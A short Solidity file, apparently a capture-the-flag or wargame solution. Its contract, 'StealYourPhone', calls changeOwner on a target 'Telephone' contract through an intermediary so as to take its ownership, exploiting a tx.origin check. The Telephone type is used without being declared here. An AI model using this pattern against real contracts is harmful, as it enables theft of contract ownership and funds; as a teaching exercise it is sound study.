pragma solidity ^0.4.18;

contract StealYourPhone {
    function changeOwner(address _telephone) {
        Telephone(_telephone).changeOwner(msg.sender);
    }
}